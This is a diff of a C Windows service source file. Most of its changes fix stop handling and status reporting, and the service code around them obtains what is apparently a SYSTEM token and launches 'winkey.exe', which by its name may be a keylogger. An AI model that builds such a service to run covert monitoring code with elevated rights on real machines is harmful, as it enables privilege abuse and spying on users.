@@ -1,7 +1,6 @@
 #include "svc.h"
 
 /*
-
 typedef struct _SERVICE_STATUS {
   DWORD dwServiceType;  The type of service. This member can be one of the following values.
   DWORD dwCurrentState; The current state of the service. This member can be one of the following values.
@@ -13,19 +12,27 @@ typedef struct _SERVICE_STATUS {
 } SERVICE_STATUS, *LPSERVICE_STATUS;
 
 */
-
+// CHECK for broken pipe 109: https://learn.microsoft.com/en-us/windows/win32/services/service-status-transitions
+//https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/Services/service-control-handler-function.md
 static DWORD WINAPI ServiceCtrlHandlerEx(DWORD ctrl, DWORD eventType, LPVOID eventData, LPVOID context)
 {
     UNREFERENCED_PARAMETER(eventType);
     UNREFERENCED_PARAMETER(eventData);
     
     t_svc_ctx *ctx = (t_svc_ctx*)context;
+    if (!ctx)
+        return (0);
 
     if (ctrl == SERVICE_CONTROL_STOP)
     {
+        if (ctx->status.dwCurrentState != SERVICE_RUNNING)
+            return (0);
         ctx->status.dwCurrentState = SERVICE_STOP_PENDING;
+        ctx->status.dwWaitHint = 3000; // estimate time for a pending start
+        ctx->status.dwControlsAccepted = 1;
         if (!SetServiceStatus(ctx->hStatus, &ctx->status))
             printf("Set service status failed: %lu", GetLastError());
+
         if (!SetEvent(ctx->hStopEvent)) // sig stop
             printf("Set event failed: %lu", GetLastError());
     }
@@ -43,9 +50,17 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     t_svc_ctx   ctx;
     ZeroMemory(&ctx, sizeof(ctx));
 
+    ctx.hStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+    if (!ctx.hStopEvent)
+    {
+        printf("CreateEvent failed: %lu\n", GetLastError());
+        return;
+    }
+
     ctx.status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     ctx.status.dwCurrentState = SERVICE_START_PENDING;
 
+    // https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-registerservicectrlhandlerexa
     ctx.hStatus = RegisterServiceCtrlHandlerExA(
         SERVICE_NAME,
         ServiceCtrlHandlerEx,
@@ -57,10 +72,10 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         return ;
     }
 
-    ctx.status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
+    ctx.status.dwControlsAccepted = SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
     ctx.status.dwCurrentState = SERVICE_RUNNING;
 
-    // notifies the SCM of the current status of service
+    // notifies the SCM of the current status of  (maj of ctx.hStatus)
     if (!SetServiceStatus(ctx.hStatus, &ctx.status))
         printf("Set service status failed: %lu", GetLastError());
     
@@ -68,7 +83,7 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     
     HANDLE  hToken = GetSystemToken();
 
-    UNREFERENCED_PARAMETER(hToken);
+    //UNREFERENCED_PARAMETER(hToken);
 
     // function for start programme winkey
     LPWSTR    exePath = L"C:\\Users\\r4mnesia\\Desktop\\Tinky\\winkey.exe"; // MAX_PATH per default == 260
@@ -96,6 +111,11 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         CloseHandle(hToken);
         return;
     }
+
+    WaitForSingleObject(ctx.hStopEvent, INFINITE);
+    
+    ctx.status.dwCurrentState = SERVICE_STOPPED;
+    SetServiceStatus(ctx.hStatus, &ctx.status);
 
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
